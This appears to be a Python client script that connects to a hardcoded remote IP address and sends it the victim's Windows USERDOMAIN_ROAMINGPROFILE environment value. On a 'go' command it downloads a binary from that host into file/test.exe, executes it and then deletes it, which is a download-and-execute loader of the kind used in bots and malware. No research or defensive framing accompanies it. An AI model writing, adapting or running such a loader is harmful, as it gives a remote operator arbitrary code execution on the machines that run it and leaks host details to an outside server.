import socket
import threading
from time import sleep
import os
from subprocess import Popen

#host = "1.209.148.160"
host = "1.209.148.159"
port = 8050

global counter

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))

def handle(s):
    while 1:
        flag = True
        d=s.recv(1024)
        if not d:
            continue
        msg = d.decode("utf-8")

        #print(msg)
        if msg == "go":
            while flag:
                d = s.recv(1024)
                if repr(d)[-4:-1] == "end":
                    print("end!")
                    flag = False
                if repr(d)[-4:-1] == "end":
                    print("end!")
                    flag = False
                with open('file/test.exe','ab+') as output:
                    output.write(d)
            print("file_send ok")
            p = Popen("./file/test.exe")
            stdout, stderr = p.communicate()
            sleep(3)
            os.remove("file/test.exe")
        else :
            s.send(msg.encode("utf-8"))


def ping(s):
    while (1):
        sleep(3)
        s.send("ping!!")

counter = 0
while 1:


    if counter == 0:
        go = os.environ['USERDOMAIN_ROAMINGPROFILE']
        counter = 1
    else:
        go = input("")
    if not go:
        continue
    else:
        s.send(go.encode("utf-8"))

    threading._start_new_thread(handle,(s,))
#threading._start_new_thread(ping,(s,))
s.close()


